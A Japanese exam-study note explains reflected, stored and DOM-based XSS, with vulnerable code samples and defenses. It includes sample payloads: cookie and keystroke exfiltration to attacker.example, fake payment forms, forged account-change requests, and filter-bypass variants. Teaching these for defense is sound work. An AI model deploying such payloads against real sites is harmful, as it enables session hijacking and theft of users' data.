# XSSの3分類（反射型・格納型・DOMベース）

XSSは「攻撃者の書いたスクリプトを、正規サイトのページの一部として被害者のブラウザで実行させる」攻撃。
3分類の違いは **スクリプトがどこを通ってページに入り込むか** だけで、実行されるスクリプトの中身（盗む・書き換える・操作する）は共通。

---

## 0. 入れようとするスクリプトの中身（3分類共通）

### 目的別の典型
| 目的 | スクリプトの例 | 関連問題 |
| --- | --- | --- |
| 動作確認（脆弱性の有無を調べる） | `<script>alert(1)</script>` | 2024h 問3 図3（診断ツール） |
| cookie窃取→セッションハイジャック | `<script>new Image().src='https://attacker.example/?c='+document.cookie</script>` | 2024h 問3 設問1(2) |
| 偽フォームの表示（フィッシング） | `<script>document.getElementById('pay').innerHTML='カード番号<input id=n>…'</script>` | 2024a 問3 表2の5行目 |
| 入力内容の盗聴（キーロガー） | `<script>document.onkeypress=function(e){new Image().src='https://attacker.example/?k='+e.key}</script>` | |
| 被害者になりすまして操作 | `<script>fetch('/mypage/change',{method:'POST',body:'mail=attacker@example.com'})</script>` | CSRFトークンも読めるのでCSRF対策をすり抜ける |
| 罠サイトへの誘導 | `<script>location.href='https://attacker.example/'</script>` | |

### 入れ方（HTMLのどこに出力されるかで変える）
| 出力される場所 | 入力する値の例 | ポイント |
| --- | --- | --- |
| タグの外（本文） | `<script>alert(1)</script>` | そのまま入る |
| 属性値の中 `value="★"` | `"><script>alert(1)</script><"` | `"` と `>` で属性とタグを閉じて脱出する。2024h 問3 図3、2024a 問3 表2の5行目がこの形 |
| 属性値の中（引用符なし） | `x onmouseover=alert(1)` | 空白で新しい属性（イベントハンドラ）を足す |
| `href` や `src` の中 | `javascript:alert(1)` | スキームでJSを実行する |
| `<script>` 内の文字列 `var s='★'` | `';alert(1);//` | 文字列を閉じて文を足す |

### scriptタグが弾かれる場合の代替（フィルタ回避）
- `<img src=x onerror=alert(1)>` …… 画像の読み込みに失敗したらイベントで実行する
- `<svg onload=alert(1)>` …… 読み込み時に実行する
- 大文字小文字を混ぜる `<ScRiPt>`、エンコードするなど。「scriptという文字列を消す」だけのブラックリスト対策が無意味な理由。

---

## 1. 反射型（Reflected XSS）
**経路：** リクエストに含まれた値を、サーバがそのままレスポンスのHTMLに埋め込んで返す。保存はされない。

**脆弱なサーバ側コードの例（PHP）**
```php
echo "検索結果: " . $_GET['q'];
```

**攻撃の流れ**
1. 攻撃者が罠URLを作る：
   `https://shop.example/search?q=<script>new Image().src='https://attacker.example/?c='+document.cookie</script>`
   （実際はURLエンコードして目立たなくする）
2. メールやSNSで、被害者にそのURLをクリックさせる。
3. サーバが q の値をそのまま埋め込んで返し、**被害者のブラウザで shop.example のスクリプトとして**実行される。

**特徴**
- 被害者は**罠リンクを踏んだ人1人**だけ。1回の攻撃で1人。
- 罠リンクへの誘導が必須（メール・掲示板・広告など）。

---

## 2. 格納型（Stored / 持続型 / 蓄積型 XSS）
**経路：** 入力値がDBなどに**保存**され、後で**別の利用者が閲覧したページ**に出力される。

**脆弱なコードの例**
```php
// 投稿時：そのまま保存
$db->insert('comments', $_POST['comment']);
// 表示時：そのまま出力
foreach ($comments as $c) echo "<p>$c</p>";
```

**攻撃の流れ**
1. 攻撃者が掲示板・レビュー・問合せフォーム・プロフィール欄などにスクリプトを投稿する：
   `素敵な商品です<script>new Image().src='https://attacker.example/?c='+document.cookie</script>`
2. そのページを見た**全員**のブラウザでスクリプトが実行される。誘導は不要。

**特徴**
- **1回の投稿で多数の利用者**に効く（2024a 問3 の空欄c＝「格納」の決め手）。
- 管理画面に出力される場合は**管理者が被害者**になる。権限が大きいので被害も大きい（2024h 問3：問合せ→問合せ管理機能）。
- 罠リンクが要らないので、利用者が気付きにくい。

---

## 3. DOMベース（DOM-based XSS）
**経路：** サーバは関与しない。**ブラウザ側のJavaScript**が、URLなど攻撃者が操作できる値（ソース）を、危険な書き込み先（シンク）にそのまま渡してしまう。

**脆弱なクライアント側コードの例**
```javascript
// URLの #以降 をそのまま画面に表示
document.getElementById('msg').innerHTML = decodeURIComponent(location.hash.slice(1));
```

**攻撃の流れ**
1. 罠URL：`https://shop.example/page#<img src=x onerror=alert(document.cookie)>`
2. 被害者がクリックすると、ページ内のJSが # 以降を innerHTML に書き込み、スクリプトが実行される。

**特徴**
- `#` 以降（フラグメント）は**サーバに送られない**。サーバのログやWAFでは検知できず、サーバ側の出力エスケープでは防げない。
- 典型的なソース：`location.hash`、`location.search`、`document.referrer`、`postMessage` のデータ
- 典型的なシンク：`innerHTML`、`outerHTML`、`document.write`、`eval`、`setTimeout(文字列)`、`location.href = ...`（javascript:スキーム）
- 誘導が必要な点は反射型と同じ。

---

## 比較表
| | 反射型 | 格納型 | DOMベース |
| --- | --- | --- | --- |
| スクリプトの置き場所 | リクエスト（URL・POSTデータ） | サーバのDBなど | URLなど（主に # 以降） |
| HTMLを組み立てる場所 | サーバ | サーバ | ブラウザのJS |
| 被害者の数 | 罠リンクを踏んだ1人 | 閲覧者全員 | 罠リンクを踏んだ1人 |
| 誘導 | 必要 | 不要 | 必要 |
| サーバのログに残るか | 残る | 投稿時に残る | 残らないことがある |

## 対策（答案で使う言い方）
| 対策 | 効く型 | 書き方 |
| --- | --- | --- |
| 出力時のエスケープ | 反射型・格納型 | 「HTMLに出力する際に `<` `>` `"` `'` `&` をエスケープする」 |
| 安全なDOM操作 | DOMベース | 「innerHTMLではなくtextContentを使う」「URLから取得した値をHTMLとして解釈させない」 |
| URLスキームの制限 | 全部 | 「href属性に出力するURLは http/https で始まるものだけ許可する」 |
| HttpOnly属性 | 被害の軽減 | 「cookieにHttpOnly属性を付与し、JavaScriptから読み取れなくする」（cookie窃取だけを防ぐ。偽フォームや操作は防げない） |
| CSP | 被害の軽減 | 「Content-Security-Policyでインラインスクリプトと許可外ドメインのスクリプト実行を禁止する」 |
| 入力値検証 | 補助 | 根本対策ではない。出力先ごとのエスケープが本筋 |
